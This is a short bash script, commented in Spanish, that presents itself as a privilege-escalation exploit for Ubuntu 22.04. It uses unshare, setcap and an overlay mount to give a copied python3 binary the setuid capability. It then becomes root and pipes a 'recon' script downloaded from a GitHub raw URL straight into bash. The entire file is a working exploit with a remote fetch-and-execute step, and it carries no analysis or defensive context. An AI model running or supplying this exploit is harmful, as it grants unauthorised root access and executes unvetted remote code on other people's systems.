#!/bin/bash

# Escalada de privilegios en Ubuntu 22.04
# Y ejecución de script con permisos root
unshare -rm sh -c "mkdir l u w m && cp /usr/bin/python3 l/; \
setcap 'cap_setuid+ep' l/python3; \
mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && \
l/python3 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"curl -s https://raw.githubusercontent.com/DriveSec/scripts/main/recon_ubuntu_system.sh | bash\")'; \
rm -rf l u w m"
